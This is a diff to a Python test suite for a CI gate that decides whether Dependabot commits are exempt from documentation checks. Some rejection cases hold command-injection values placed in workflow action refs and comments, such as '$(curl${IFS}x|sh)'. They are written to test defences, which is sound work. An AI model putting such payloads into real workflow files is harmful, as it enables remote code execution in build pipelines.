@@ -279,6 +279,26 @@ class HlddGateTests(unittest.TestCase):
                 self.assertIn("1 of them dependency-only update(s)", result.stdout)
                 self.git("reset", "-q", "--hard", base)
 
+    def test_dependabot_commit_that_edits_the_hldd_is_not_exempt(self):
+        base = self.seed({"site/package.json": package()})
+        self.commit_as(DEPENDABOT, {
+            "site/package.json": package(dependencies={"astro": "^7.3.3"}),
+            "docs/ARCHITECTURE.md": DOC + "\nThe site uses astro 7.3.3.\n",
+        })
+        result = self.gate("--base", base)
+        self.assertNotIn("dependency-only", result.stdout)
+
+    def test_dependabot_scalar_type_change_fails(self):
+        base = self.seed({"site/package.json": package(private=True)})
+        self.reject_dependabot(base, {
+            "true to 1": {"site/package.json": package(dependencies={"astro": "^7.3.3"}, private=1)},
+        })
+        base = self.seed({"packages/tropo/pyproject.toml": PYPROJECT + "\n[tool.setuptools]\ninclude-package-data = false\n"})
+        bumped = PYPROJECT.replace("packaging>=24.0", "packaging>=25.0")
+        self.reject_dependabot(base, {
+            "false to 0": {"packages/tropo/pyproject.toml": bumped + "\n[tool.setuptools]\ninclude-package-data = 0\n"},
+        })
+
     def test_merged_dependabot_pull_request_passes(self):
         base = self.seed({"site/package.json": package(), "site/package-lock.json": lockfile("7.3.2")})
         self.dependabot_branch({
@@ -372,6 +392,7 @@ class HlddGateTests(unittest.TestCase):
             "branch ref": {".github/workflows/ci.yml": WORKFLOW.replace("checkout@v7.0.1", "checkout@main")},
             "shell ref": {".github/workflows/ci.yml": WORKFLOW.replace("checkout@v7.0.1", "checkout@$(curl${IFS}x|sh)")},
             "shell comment": {".github/workflows/ci.yml": WORKFLOW.replace("# v7.0.0", "# $(curl example.invalid)")},
+            "64-hex ref": {".github/workflows/ci.yml": WORKFLOW.replace(f"setup-node@{'a' * 40}", f"setup-node@{'c' * 64}")},
             "SHA pin to tag": {".github/workflows/ci.yml": WORKFLOW.replace(f"setup-node@{'a' * 40} # v7.0.0", "setup-node@v7")},
             **{
                 f"digit-led ref {ref}": {".github/workflows/ci.yml": WORKFLOW.replace("checkout@v7.0.1", f"checkout@{ref}")}
